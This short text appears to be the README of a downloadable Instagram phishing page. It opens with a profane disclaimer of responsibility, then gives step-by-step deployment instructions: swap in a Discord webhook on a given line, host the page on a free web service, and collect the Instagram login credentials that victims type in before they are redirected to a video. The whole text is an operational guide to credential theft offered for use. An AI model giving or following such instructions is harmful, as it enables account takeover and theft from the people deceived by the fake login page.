**- Note : Don't forgot I don't give a fuck about what you do with my code, I am obviously not responsable of shit you do ok ? 😉**<br>
**- My Instagram phishing page is really easy to use, you only have to replace WEBHOOK on line 101 by your Discord webhook.**

**- Next you upload it in your website (like netlify or 000webhost, they are free)**<br>
**- When someone will login you will receive his credentials and he will be redirected to a funny video (the one in the link, you can change it by editing the link and the js part in HTML on line 108).**
